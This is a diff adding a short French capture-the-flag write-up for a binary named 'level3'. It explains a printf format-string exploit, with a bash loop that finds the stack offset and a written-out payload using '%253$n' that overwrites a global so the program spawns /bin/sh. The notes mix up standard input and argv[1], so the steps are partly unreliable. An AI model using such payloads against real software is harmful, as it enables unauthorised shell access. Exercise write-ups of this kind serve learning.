@@ -1,0 +1,12 @@
+Lors du disass, on voit que le main appel uniquement une fonction v.
+Celle ci fait un fgets sur l'entré standard avant de le print sur la sortie avec un printf. Ensuite, le programme vérifie la valeur d'une variable m, et si elle est égale a 0x40 (64), effectue un fwrite puis un call system de "/bin/sh". 
+Nous allons donc utiliser l'exploit de printf sur le format afin de modifier la valeur de m afin qu'elle soit a égale a 64.
+Pour ce faire, nous allons d'abord trouver l'adresse de la variable via gdb. On trouve l'adresse 0x0804988c.
+Nous allons ensuite devoir trouver l'offset de argv[1] sur la stack. Pour se faire, nous allons utiliser le script suivant :
+for ((i=0; i<400; i++)); do echo "Index $i: %$i\$x" | ./level3 AAAAA; done | grep 4141
+
+Ce script nous indique que l'argv[1] se trouve a l'offset 253.
+Il ne nous reste qu'a afficher 64 octets afin de pouvoir les mettre en memoire via le format "n".
+
+./level3 `echo $'\x8c\x98\x04\x08'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%253$n
